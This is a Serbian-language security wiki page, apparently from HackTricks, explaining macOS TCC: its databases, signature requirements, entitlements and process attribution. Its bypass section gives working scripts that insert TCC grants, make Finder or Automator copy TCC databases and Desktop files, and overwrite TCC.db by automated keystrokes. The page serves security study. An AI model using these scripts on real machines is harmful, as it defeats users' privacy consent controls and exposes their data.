# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Osnovne informacije**

**TCC (Transparency, Consent, and Control)** je bezbednosni protokol usmeren na regulisanje dozvola aplikacija. Njegova primarna uloga je zaštita osetljivih funkcija kao što su **usluge lokacije, kontakti, fotografije, mikrofon, kamera, pristupačnost i potpuni pristup disku**. Zahtevajući izričitu saglasnost korisnika pre nego što aplikaciji odobri pristup ovim funkcijama, TCC unapređuje privatnost i kontrolu korisnika nad njihovim podacima.

Korisnici nailaze na TCC kada aplikacije zatraže pristup zaštićenim funkcijama. To je vidljivo kroz upit koji korisnicima omogućava da **odobре ili odbiju pristup**. Pored toga, TCC podržava direktne radnje korisnika, kao što su **prevlačenje i ispuštanje datoteka u aplikaciju**, čime se odobrava pristup određenim datotekama i osigurava da aplikacije imaju pristup samo onome što je izričito dozvoljeno.

![Primer TCC upita](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC-om** upravlja **daemon** koji se nalazi na putanji `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` i čija je konfiguracija definisana u `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registruje mach servis `com.apple.tccd.system`).

Postoji i **tccd u korisničkom režimu**, koji se pokreće za svakog prijavljenog korisnika i definisan je u `/System/Library/LaunchAgents/com.apple.tccd.plist`; on registruje mach servise `com.apple.tccd` i `com.apple.usernotifications.delegate.com.apple.tccd`.

Ovde možete videti tccd pokrenut kao sistemski proces i kao korisnički proces:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Dozvole se **nasleđuju od nadređene** aplikacije, a **dozvole** se **prate** na osnovu **Bundle ID**-a i **Developer ID**-a.

### TCC baze podataka

Dozvole/odbijanja se zatim čuvaju u nekim TCC bazama podataka:

- Sistemska baza podataka u **`/Library/Application Support/com.apple.TCC/TCC.db`** .
  - Ova baza podataka je **zaštićena SIP-om**, pa samo SIP bypass može da upisuje u nju.
- Korisnička TCC baza podataka **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** za korisničke postavke.
  - Ova baza podataka je zaštićena, pa samo procesi sa visokim TCC privilegijama, kao što je Full Disk Access, mogu da upisuju u nju (ali nije zaštićena SIP-om).

> [!WARNING]
> Prethodne baze podataka su takođe **TCC zaštićene za pristup čitanju**. Zato **nećete moći da pročitate** svoju uobičajenu korisničku TCC bazu podataka osim ako to ne radite iz TCC privilegovanog procesa.
>
> Ipak, imajte na umu da proces sa ovim visokim privilegijama (kao što su **FDA** ili **`kTCCServiceEndpointSecurityClient`**) može da upisuje u korisničku TCC bazu podataka.

- Postoji i **treća** TCC baza podataka u **`/var/db/locationd/clients.plist`** koja označava klijente kojima je dozvoljen **pristup uslugama lokacije**.
- **`/Library/Application Support/com.apple.TCC/REG.db`** beleži registrovane putanje TCC baza podataka. Podmetnuta korisnička baza podataka može biti odbijena ako nije registrovana; samo poznavanje ove putanje ne daje pristup nijednoj od tih baza podataka.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`** sadrži odluke koje donosi upravljana kontrola PPPC (Privacy Preferences Policy Control). Proverite ovu datoteku kada aplikacija ima upravljanu dozvolu koja ne postoji u uobičajenim redovima `access`.<sup>[[7]](#references)</sup>
- SIP-om zaštićena datoteka **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (koju svako može da čita) jeste lista dozvoljenih aplikacija kojima je potreban TCC izuzetak.

> [!TIP]
> TCC baza podataka u **iOS**-u nalazi se u **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> **UI centra za obaveštenja** može da **izvrši izmene u sistemskoj TCC bazi podataka**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
> Međutim, korisnici mogu **resetovati pravila** pomoću komandno-linijskog uslužnog programa **`tccutil`**; on nema dokumentovanu operaciju za upite.<sup>[[4]](#references)</sup>

#### Upiti nad bazama podataka

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Proverom obe baze možeš da vidiš koje je dozvole aplikacija odobrila, zabranila ili nema (zatražiće ih).

- **`service`** je tekstualni prikaz TCC **dozvole**
- **`client`** je **bundle ID** ili **putanja do binarne datoteke** kojoj su dozvole dodeljene
- **`client_type`** označava da li je u pitanju Bundle Identifier(0) ili apsolutna putanja(1)

<details>

<summary>Kako izvršiti ako je u pitanju apsolutna putanja</summary>

Samo pokreni **`launctl load you_bin.plist`**, uz plist poput ovog:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`** može imati različite vrednosti: denied(0), unknown(1), allowed(2) ili limited(3).
- **`auth_reason`** može imati sledeće vrednosti: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- Polje **csreq** služi za navođenje načina provere binarne datoteke koja će se izvršiti i kojoj će se dodeliti TCC dozvole:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- Za više informacija o **drugim poljima** tabele, [**pogledajte ovaj blog post**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Možete i da proverite **već dodeljene dozvole** aplikacijama u `Sistemske postavke --> Bezbednost i privatnost --> Privatnost --> Datoteke i fascikle`.

> [!TIP]
> Korisnici mogu da **resetuju** pravila pomoću **`tccutil`**, ali moraju da pregledaju baze podataka da bi proverili dodeljene dozvole.<sup>[[4]](#references)</sup>

#### Resetovanje TCC dozvola

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Identifikujte odobrenja za pošiljaoca i cilj Apple Events

Odobrenje za Automation predstavlja odluku **pošiljalac-ka-cilju**, a ne dozvolu za upravljanje svim aplikacijama. Ako imate pristup korisničkoj bazi podataka, navedite dozvoljene parove pošiljalac/cilj pre nego što isprobate [Apple Events](macos-apple-events.md) ili Finder radne tokove u nastavku. `csreq` identifikuje pošiljaoca, a `indirect_object_code_identity` cilj; dekodirajte svaki blob koji nije null pomoću prethodno opisane metode `csreq`.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### TCC provere potpisa

TCC **baza podataka** čuva **Bundle ID** aplikacije, ali takođe **čuva** **informacije** o **potpisu** kako bi se **uverila** da je aplikacija koja traži dozvolu ispravna.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> Zato druge aplikacije koje koriste isto ime i bundle ID neće moći da pristupe dozvolama dodeljenim drugim aplikacijama.

### Entitlements i TCC dozvole

TCC odobrenje ne nadjačava ograničenja **App Sandbox**-a. Klijentu kamere u sandboxu potreban je `com.apple.security.device.camera`; Apple ovu mogućnost omogućava i aplikacijama sa Hardened Runtime-om. Nijedan od ovih entitlements-a ne zaobilazi zaseban prompt za saglasnost korisnika. Nemojte smatrati da je sandbox entitlement bezuslovni preduslov za svaki proces koji nije u sandboxu. Ako zahtev ne uspe, proverite i entitlements izvršne datoteke i odgovornu aplikaciju.<sup>[[8]](#references)[[9]](#references)</sup>

Imajte na umu da su entitlements plist datoteke i deo su code sig-a; dodatno se heširaju u code sig-u pomoću posebnih slotova i može ih proveravati kernel pomoću kernel koda ili user-mode koda koristeći `csops(#169)` ili `csops_audittoken(#170)`.

Međutim, da bi aplikacije **pristupile** **određenim korisničkim fasciklama**, kao što su `~/Desktop`, `~/Downloads` i `~/Documents`, **nije im potreban** nijedan poseban **entitlement**. Sistem će transparentno upravljati pristupom i po potrebi **prikazati prompt korisniku**.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple-ove aplikacije **neće generisati promptove**. Na njihovoj listi **entitlements** nalaze se **unapred dodeljena prava**, što znači da **nikada neće prikazati iskačući prozor**, **niti** će se pojaviti u bilo kojoj od **TCC baza podataka**. Na primer:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

Ovo će sprečiti Calendar da od korisnika traži pristup podsetnicima, kalendaru i adresaru.

> [!TIP]
> Pored zvanične dokumentacije o entitlements, moguće je pronaći i nezvanične **zanimljive informacije o entitlements na** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Neke TCC dozvole su: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Ne postoji javna lista koja ih sve definiše, ali možete pogledati ovu [**listu poznatih**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Osetljive nezaštićene lokacije

- $HOME (sam po sebi)
- $HOME/.ssh, $HOME/.aws itd.
- /tmp

### Namera korisnika / com.apple.macl

Kao što je ranije pomenuto, moguće je **dodeliti aplikaciji pristup datoteci tako što ćete je prevući i otpustiti na nju**. Ovaj pristup neće biti naveden ni u jednoj TCC bazi podataka, već će biti sačuvan kao **prošireni** **atribut datoteke**. Ovaj atribut će **sačuvati UUID** dozvoljene aplikacije:<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> Zanimljivo je da atributom **`com.apple.macl`** upravlja **Sandbox**, a ne tccd.
>
> Takođe imajte na umu da, ako premestite na drugi računar datoteku koja dozvoljava UUID aplikacije na vašem računaru, ona neće odobriti pristup toj aplikaciji jer će ista aplikacija imati drugačiji UID.

Prošireni atribut `com.apple.macl` **ne može da se ukloni** kao drugi prošireni atributi jer je **zaštićen SIP-om**. Međutim, kao što je [**objašnjeno u ovom postu**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), moguće je onemogućiti ga tako što ćete datoteku **spakovati u ZIP arhivu**, **obrisati** je i **raspakovati**.<sup>[[3]](#references)</sup>






## XNU mehanizam odgovornog procesa

U macOS/iOS-u, mehanizam **odgovornog procesa** je ključna bezbednosna funkcija koju koriste okvir **TCC (Transparency, Consent, and Control)** i drugi bezbednosni sistemi da bi pratili koji je proces u krajnjoj liniji odgovoran za neku radnju, čak i kroz lance podređenih procesa.

Kada TCC proverava dozvole (npr. za kameru, mikrofon, lokaciju), ne proverava uvek neposredni proces koji šalje zahtev. Umesto toga, proverava **odgovorni proces** — obično GUI aplikaciju koja je pokrenula radnju, čak i ako stvarni zahtev potiče od pomoćnog procesa ili demona.

Da biste utvrdili kojoj se aplikaciji zahtev zaista pripisuje, pratite TCC-ove poruke `AttributionChain` dok pokrećete zaštićenu operaciju. To je pouzdanije nego da dodelite dozvolu izvršnoj datoteci pomoćnog procesa samo zato što je ona pozvala API. Uporedite prijavljeni identitet sa bundle ID-om ili putanjom i zahtevom za potpisivanje u odgovarajućem redu `access`.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Kako se podešava odgovorni proces</summary>

### Polja strukture procesa

Svaki proces u XNU održava dva ključna UUID identifikatora:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: UUID samog procesa (iz komande učitavanja `LC_UUID` njegove Mach-O binarne datoteke)
- **`p_responsible_pid`**: PID odgovornog procesa
- **`p_responsible_uuid`**: UUID odgovornog procesa (ostaje sačuvan čak i nakon što se taj proces završi)

### Kako se postavlja odgovorni proces

1. **Tokom kreiranja procesa (fork)**

Kada se novi proces kreira pomoću `fork()` ili `posix_spawn()`, odgovorni proces nasleđuje se od roditeljskog procesa (sistemski poziv `exec()` ponovo koristi postojeću strukturu `proc`, pa se ovaj korak tamo ne ponavlja):

**Lokacija**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**Ključne tačke:**
- Procesi potomci **nasleđuju** roditeljev `p_responsible_pid`
- Time se stvara **lanac odgovornosti** kroz hijerarhiju procesa
- Odgovorni proces obično upućuje na originalnu GUI aplikaciju

2. **Osnovna funkcija: `proc_set_responsible_pid()`**

**Lokacija**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**Šta ova funkcija radi:**
1. **Postavlja PID odgovornog procesa** u ciljnom procesu
2. **Pronalazi odgovorni proces** pomoću `proc_find()` (povećava broj referenci)
3. **Kopira UUID** iz `p_uuid` odgovornog procesa u `p_responsible_uuid` ciljnog procesa
4. **Oslobađa referencu** pomoću `proc_rele()` (smanjuje broj referenci)

3. **Zašto čuvati i PID i UUID?**

Pristup sa dvostrukim čuvanjem rešava ključan problem:

| Field | Purpose | Problem | Solution |
|-------|---------|---------|----------|
| `p_responsible_pid` | Brzo pronalaženje trenutnog procesa | PID može ponovo biti dodeljen nakon izlaska procesa | Koristi se za pronalaženje aktivnog procesa |
| `p_responsible_uuid` | Trajna identifikacija | Ostaje dostupan i nakon završetka procesa | Koristi se za bezbednosne provere i reviziju |

**Problem**: Ako odgovorni proces izađe pre podređenog procesa, njegov PID može biti ponovo dodeljen potpuno drugom procesu.

**Rešenje**: UUID je nepromenljiv i jedinstveno identifikuje konkretnu binarnu datoteku koja je bila odgovorna, čak i nakon što se proces završi.

### Tok kreiranja procesa

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### Izvor UUID-a: LC_UUID komanda za učitavanje

1. **Vreme kompajliranja**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **Vreme izvršavanja**

**Lokacija**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **Sačuvano u strukturi procesa**

**Lokacija**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**Lokacija**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Umetanje u TCC

Ako u nekom trenutku uspete da dobijete pristup za pisanje u TCC bazu podataka, možete da upotrebite nešto poput sledećeg da biste dodali unos (uklonite komentare):

<details>

<summary>Primer umetanja u TCC</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

Ako ste uspeli da uđete u aplikaciju sa nekim TCC dozvolama, pogledajte sledeću stranicu sa TCC payload-ima da biste ih zloupotrebili:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Saznajte više o Apple Events na stranici:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automatizacija (Finder) do FDA\*

TCC naziv dozvole Automation je: **`kTCCServiceAppleEvents`**\
Ova konkretna TCC dozvola takođe određuje **aplikaciju kojom se može upravljati** u TCC bazi podataka (tako da dozvole ne omogućavaju upravljanje svime).

**Finder** je aplikacija koja **uvek ima FDA** (čak i ako se ne pojavljuje u korisničkom interfejsu), pa ako imate privilegije **Automation** nad njom, možete zloupotrebiti njene privilegije da biste je **naveli da izvrši neke radnje**.\
U ovom slučaju vašoj aplikaciji bi bila potrebna dozvola **`kTCCServiceAppleEvents`** nad **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

Prijavljena varijanta upisa, kada je dostupan Automation put do Finder-a, sastoji se u tome da Finder **preimenuje korisnički direktorijum `com.apple.TCC`**. Baza podataka na preimenovanoj putanji zatim je kopirana u privremeni direktorijum, tamo izmenjena, kopirana nazad, a ime direktorijuma vraćeno. Novi red `kTCCServiceAppleEvents` mora da identifikuje **i binarnu datoteku koja šalje zahtev i Finder**, uključujući njihove code requirements; davanje dozvole pošiljaocu bez identiteta cilja nije isto. Ova tehnika zavisi od putanje, zato je proverite na ciljnoj verziji macOS-a umesto da pretpostavite da Automation pristup Finder-u sam po sebi omogućava proizvoljne upise u bazu podataka.<sup>[[11]](#references)</sup>

> [!WARNING]
> Sa ovom dozvolom moći ćete da **zatražite od Finder-a da pristupi folderima ograničenim TCC-om** i da vam dostavi datoteke, ali, koliko znam, **nećete moći da naterate Finder da izvrši proizvoljan kod** kako biste u potpunosti zloupotrebili njegov FDA pristup.
>
> Zato nećete moći da zloupotrebite sve mogućnosti FDA-a.

Ovo je TCC upit za dobijanje Automation privilegija nad Finder-om:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Imajte na umu da aplikacija **Automator** ima TCC dozvolu **`kTCCServiceAppleEvents`**, pa može da **kontroliše bilo koju aplikaciju**, kao što je Finder. Dakle, ako imate dozvolu za kontrolu aplikacije Automator, možete da kontrolišete i **Finder** pomoću koda kao što je ovaj ispod:

<details>

<summary>Dobijanje shell-a unutar Automator-a</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

Isto se dešava i sa aplikacijom **Script Editor**: može da upravlja aplikacijom Finder, ali pomoću AppleScripta ne možete da je naterate da izvrši skriptu.

### Automatizacija (SE) za neke TCC dozvole

**System Events može da kreira Folder Actions, a Folder Actions mogu da pristupe nekim TCC fasciklama** (Desktop, Documents i Downloads), pa se skripta poput sledeće može iskoristiti za zloupotrebu ovog ponašanja:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automatizacija (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) do FDA\*

Automatizacija na **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) omogućava slanje **pritisaka tastera procesima**. Na ovaj način možete zloupotrebiti Finder da promeni korisnikov TCC.db ili da dodeli FDA proizvoljnoj aplikaciji (mada će možda biti zatražena lozinka).

Primer prepisivanja korisnikovog TCC.db pomoću Findera:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` do FDA\*

Pogledajte ovu stranicu za neke [**payloads za zloupotrebu Accessibility dozvola**](macos-tcc-payloads.md#accessibility) radi privesc-a do FDA\* ili, na primer, pokretanja keylogger-a.

### **Endpoint Security Client do FDA**

Ako imate **`kTCCServiceEndpointSecurityClient`**, imate FDA. Kraj.

### System Policy SysAdmin File do FDA

**`kTCCServiceSystemPolicySysAdminFiles`** omogućava **promenu** atributa **`NFSHomeDirectory`** korisnika, čime se menja njegova početna fascikla i omogućava **zaobilaženje TCC-a**.<sup>[[5]](#references)</sup>

### Korisnička TCC baza podataka do FDA

